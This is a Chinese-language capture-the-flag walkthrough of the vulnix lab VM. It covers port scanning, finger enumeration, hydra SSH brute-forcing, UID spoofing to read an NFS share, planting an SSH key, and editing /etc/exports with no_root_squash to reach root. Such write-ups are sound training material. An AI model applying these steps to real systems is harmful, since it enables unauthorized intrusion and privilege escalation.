

## 端口扫描

```bash
┌──(kali㉿kali)-[~/workspace]
└─$ sudo nmap -sT -sCV -O -p 22,25,79,110,111,143,512,513,514,993,995,2049,39615,42890,42980,46420,53936  192.168.10.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 03:57 EDT
Nmap scan report for 192.168.10.16
Host is up (0.0014s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: 2024-04-14T15:58:52+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=vulnix
| Not valid before: 2012-09-02T17:40:12
|_Not valid after:  2022-08-31T17:40:12
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.\x0D
110/tcp   open  pop3       Dovecot pop3d
|_pop3-capabilities: SASL CAPA PIPELINING RESP-CODES TOP UIDL STLS
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2024-04-14T15:58:49+00:00; +8h00m00s from scanner time.
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      40477/udp6  mountd
|   100005  1,2,3      42980/tcp   mountd
|   100005  1,2,3      50001/tcp6  mountd
|   100005  1,2,3      57461/udp   mountd
|   100021  1,3,4      46420/tcp   nlockmgr
|   100021  1,3,4      50875/tcp6  nlockmgr
|   100021  1,3,4      54460/udp6  nlockmgr
|   100021  1,3,4      57645/udp   nlockmgr
|   100024  1          40655/tcp6  status
|   100024  1          52804/udp   status
|   100024  1          53936/tcp   status
|   100024  1          56044/udp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp   open  imap       Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS IMAP4rev1 LOGINDISABLEDA0001 more have post-login listed IDLE capabilities STARTTLS OK LITERAL+ SASL-IR Pre-login ENABLE ID
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2024-04-14T15:58:49+00:00; +8h00m00s from scanner time.
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login      OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS IMAP4rev1 more have post-login listed IDLE capabilities AUTH=PLAINA0001 OK LITERAL+ SASL-IR Pre-login ENABLE ID
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2024-04-14T15:58:49+00:00; +7h59m59s from scanner time.
995/tcp   open  ssl/pop3   Dovecot pop3d
|_pop3-capabilities: USER CAPA PIPELINING RESP-CODES TOP UIDL SASL(PLAIN)
|_ssl-date: 2024-04-14T15:58:49+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
2049/tcp  open  nfs        2-4 (RPC #100003)
39615/tcp open  mountd     1-3 (RPC #100005)
42890/tcp open  mountd     1-3 (RPC #100005)
42980/tcp open  mountd     1-3 (RPC #100005)
46420/tcp open  nlockmgr   1-4 (RPC #100021)
53936/tcp open  status     1 (RPC #100024)
MAC Address: 00:0C:29:87:35:1D (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.52 seconds
```

## 寻找立足点

找到个共享文件夹
但是权限不对，无法打开
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ ls -la
总计 12
drwxrwxrwx  3 root   root    4096  4月14日 07:33 .
drwx------ 25 kali   kali    4096  4月14日 07:45 ..
drwxr-x---  2 nobody nogroup 4096 2012年 9月 2日 tmp
```

### port 79
finger服务
使用用户名登录
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ finger vulnix@192.168.10.16
Login: vulnix                           Name:
Directory: /home/vulnix                 Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

### hydra暴力破解
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ hydra -l user -P passwd 192.168.10.16 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-14 08:04:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://192.168.10.16:22/
[22][ssh] host: 192.168.10.16   login: user   password: letmein
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-14 08:04:42
```

login: user   password: letmein
得到一个用户及密码
这靶机有点抽象

### 查看共享文件夹文件
ssh连接后看下家目录
```bash
user@vulnix:~$ ls /home
user  vulnix
```
看到就是两个用户
看看vulnix的id
```bash
user@vulnix:~$ id vulnix
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
```
在本机创建一个一模一样的用户
```bash
sudo groupadd -g 2008 vulnix
sudo useradd -u 2008 -g 2008 -m -s /bin/bash vulnix
```
然后登录该用户查看共享文件夹内容
```bash
┌──(vulnix㉿kali)-[/tmp/vulnix]
└─$ ls -la
总计 20
drwxr-x---  2 vulnix vulnix 4096 2012年 9月 2日 .
drwxrwxrwt 16 root   root   4096  4月15日 01:41 ..
-rw-r--r--  1 vulnix vulnix  220 2012年 4月 3日 .bash_logout
-rw-r--r--  1 vulnix vulnix 3486 2012年 4月 3日 .bashrc
-rw-r--r--  1 vulnix vulnix  675 2012年 4月 3日 .profile
```
看到没有什么信息
但是可以上传ssh公钥登录

### ssh密钥登录

简单来说就是使用ssh-keygen生成密钥对
通过nfs上传并使用ssh密钥登录
设置一下权限
.ssh文件夹的权限为700
authorized_keys（即公钥）的权限为600
使用`ssh -i id_rsa vulnix@192.168.10.16 -oPubkeyAcceptedKeyTypes=ssh-rsa`登录

sudo -l
```bash
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
vulnix@vulnix:~$ sudoedit /etc/exports
```
可以修改共享目录
直接添加root然后同样使用上传ssh公钥的方式提权
```bash
vulnix@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix    *(rw,root_squash)
/root *(no_root_squash,insecure,rw)
```